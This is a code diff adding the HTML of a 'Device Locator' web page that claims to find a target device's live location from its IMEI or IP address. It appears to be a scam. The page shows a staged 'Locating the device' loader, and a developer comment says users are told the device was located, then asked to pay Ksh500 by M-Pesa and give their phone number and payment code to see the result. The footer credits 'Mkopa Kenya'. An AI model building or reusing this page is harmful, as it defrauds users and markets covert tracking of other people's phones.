@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Location</title>
+    <link rel="stylesheet" href="locate.css" title="" type="text/css" />
+</head>
+<body>
+    <section class="introduction" id="intro">
+        <h1>Device Locator</h1>
+        <div class="Alert" id="alert">
+          You must accept the terms and conditions!  
+        </div>
+       <div id="ff"> <b id="a"><b></div><br /><br />
+            <div id="s" style="display:none">
+        <span><input type="checkbox" name="isconfirm" id="terms" required/>I have read and accepted the <a href="#">Terms and conditions.</a></span><br />
+        <button type="submit" id="userInfoBt">PROCEED</button>
+        </div>
+    </section>
+    <div class="userContainer" id="userContainer" style="display:none">
+        <div class="Alert" id="userAlert">
+            <strong>Enter the required details!</strong>
+        </div>
+        <fieldset>
+            <legend>User Details</legend>
+            <label for="name">Name:</label>
+            <input type="text" id="userName" placeholder="Enter your first name..."/>
+            <label for="deviceBrand">DeviceBrand:</label>
+            <input type="text" name="" id="deviceBrand" placeholder="e.g Samsung Galaxy A03..." /><br /><br />
+            <button id="accept">Submit</button>
+        </fieldset>
+    </div>
+    <div class="container" id="container" style="display:none">
+     <p>How would you like to locate the device?</p>
+        <select name="code" id="code">
+        <option value="">Make a choice...</option>
+        <option value="IMEI">IMEI</option>
+        <option value="IP address">IP address</option>
+        </select>
+    </div>
+<div class="Form" id="Form" style="display:none;">
+        <div id="erR" style="display:none;">
+        <p>Please enter a valid IP address or IMEI number</p>  
+        </div>
+        <div class="IP" id="ipInput" style="display:none;">
+            <div id="validationResult">
+                
+            </div>
+        <label for="ip">IP address:</label>
+        <input type="text" name="ip" id="ip" placeholder="Enter the target IP address..." required/><br />
+         </div>
+    
+         <div class="IMEI" id="imeiInput" style="display:none;">
+        <label for="imei">IMEI number:</label>
+        <input type="number" name="imei" id="imei" placeholder="Enter the target IMEI number..." required/>  
+         </div><br />
+    
+    <button id="view-location" style="display:none;">Locate Device</button>
+</div>
+<div class="Arr" id="Arr" style="display:none;">
+    
+    <div id="firstAlert" style="display:none;">
+        <span class="loader"></span>Locating the device please wait...  
+    </div>
+    
+    <div id="secondAlert" style="display:none;">
+       <!-- The device was successfully located ... Complete the payment to view the live location of the device! -->
+    </div><br /><br />
+    <!--Eliud add a payment section ..this button should direct the user to the payment section-->
+    <div class="payment" id="payment" style="display:none;">
+        <button id="locateBt">Proceed</button>
+    </div>
+ </div>  
+ <div id="payments" style="display:none">
+        <div class="payAlert" id="payAlert1">Enter the payment phone number!</div>
+        <div class="payAlert" id="payAlert2"> <span class="loader"></span><span>Validating your payment...</span></div>
+        <div class="payAlert" id="payAlert3"> <span class="loader"></span><span>Processing your payment...</span></div>
+         <div class="payAlert" id="payAlert4">
+             <p>Paybill: <strong>1234567</strong></p>
+             <p>Account no.: <strong>22745538</strong></p>
+             <p>Amount: <strong>Ksh500</strong></p>
+         </div>
+          <div class="payAlert" id="payAlert5">Enter the mpesa code!</div>
+      <fieldset>
+          <legend>Payment Information</legend>
+          <label for="tel" id="label">Phone:</label>
+          <input type="tel" name="" id="tel" value="" placeholder="Enter your phone number..." required />
+          <label for="amount" id="label2">Amount:</label>
+          <input type="text" name="amount" id="amount" value=" Ksh500" readonly/>
+          <label for="Mpesa code" id="label3">Mpesa code:</label>
+          <input type="text" id="mpesaCode" placeholder="Enter mpesa code ..." required style="display:none"/>
+          <div id="pay">
+<button type="submit" id="pay1">Initiate STK push</button> <button type="submit" id="pay2">Use paybill</button>   
+          </div>
+      </fieldset>
+ </div>
+    <div id="location-info" style="display:none">
+        <h1>Location Information</h1>
+        <p>Country: <span id="country"></span></p>
+        <p>Region: <span id="region"></span></p>
+        <p>City: <span id="city"></span></p>
+        <p>Latitude: <span id="latitude"></span></p>
+        <p>Longitude: <span id="longitude"></span></p>
+        <p>Timezone: <span id="timezone"></span></p>
+        <p>ISP: <span id="isp"></span></p>
+        <p>Live Location: <a id="live-location" href="#" target="_blank">View on Map</a></p>
+    </div>
+    <footer class="footer">
+        Powered by Mkopa Kenya
+    </footer>
+    <script src="locate.js"></script>
+</body>
+</html>
